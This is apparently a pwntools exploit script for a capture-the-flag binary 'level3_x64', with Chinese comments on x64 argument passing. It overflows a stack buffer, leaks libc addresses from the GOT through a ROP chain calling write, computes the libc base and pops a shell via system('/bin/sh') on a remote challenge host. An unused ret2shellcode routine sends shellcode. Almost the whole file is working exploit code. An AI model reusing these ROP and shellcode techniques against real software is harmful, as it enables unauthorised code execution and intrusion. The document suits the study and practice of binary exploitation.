import time
from typing import List
from pwn import *
import os


class Util:
    def use_randoms(length: int, char: chr = None, encoding: str = 'ascii'):
        if not enable_use_randoms or char:
            if not char:
                char = 'a'
            r = char * length
        else:
            r = randoms(length, string.ascii_letters)
        return r.encode(encoding)

    def start_process(target: str):
        os.system(f'chmod 777 {target}')
        p = process(target)
        return p


def se(data): return r.send(data)
def sa(delim, data): return r.sendafter(delim, data)
def sl(data): return r.sendline(data)
def sla(delim, data): return r.sendlineafter(delim, data)
def sea(delim, data): return r.sendafter(delim, data)
def rc(numb=4096): return r.recv(numb)
def rl(): return r.recvline()
def ru(delims): return r.recvuntil(delims)
def uu32(data): return u32(data.ljust(4, b'\0'))
def uu64(data): return u64(data.ljust(8, b'\0'))
def info_addr(tag, addr): return r.info(tag + ': {:#x}'.format(addr))


r = None
use_randoms = Util.use_randoms


def start_game(local: bool = True):
    if local:
        global target
        return Util.start_process(target)
    else:
        global target_host
        return remote(target_host[0], target_host[1])


enable_use_randoms = False
target: str = './level3_x64'
target_host = ('redirect.do-not-trust.hacking.run', 10274)

context.os = 'linux'
context.arch = 'amd64'  # i386 amd64
context.log_level = 'debug'
elf = ELF(target)  # load target and show its checksec
r = start_game(False)
# time.sleep(10)
main_addr = p64(elf.symbols['main'])
plt_write = p64(elf.plt['write'])

padding = b'a' * 128 + p64(0xdeadbeaf)
# x86函数传参：直接从栈上读
# x64函数传参：按 rdi, rsi, rdx, rcx, r8, r9顺序读，后续的从栈上读
# 故x64需要调用ROP实现pop将参数从栈中传入寄存器
# ROPgadget --binary level3_x64  | grep rdi
pop_rdi = p64(0x4006b3)  # pop rdi ; ret
# ROPgadget --binary level3_x64  | grep rsi
pop_rsi_r15 = p64(0x04006b1)  # pop rsi ; pop r15 ; ret
# ROPgadget --binary level3_x64  | grep ret
rop_ret = p64(0x0400499) # ret

def leak(func_name: str):
    got_addr = p64(elf.got[func_name])
    payload = padding
    # write(fd,content,length)
    payload += pop_rdi + p64(1) + pop_rsi_r15 + \
        got_addr + p64(0) + plt_write + main_addr
    sla(b':\n', payload)
    write_addr = struct.unpack('<q', rc(8))[0]
    print(f'{func_name}_addr', hex(write_addr))
    return write_addr


write_addr = leak('write')
leak('read')
leak('__libc_start_main')

offset = write_addr - 0x0f73b0  # libc_write
system_addr = p64(0x0453a0 + offset)
binsh_addr = p64(0x18ce57 + offset)

payload = padding + rop_ret + pop_rdi + binsh_addr  + system_addr
sl(payload)

r.interactive()
sys.exit(0)
gamebox = ELF(target)


def ret2shellcode():
    sh = asm(shellcraft.sh())
    p1 = sh
    sla('name\n', p1)
    name_addr = 0x601080
    p2 = flat(['a'*0x28, name_addr])
    sla('me?\n', p2)
    r.interactive()
    pass
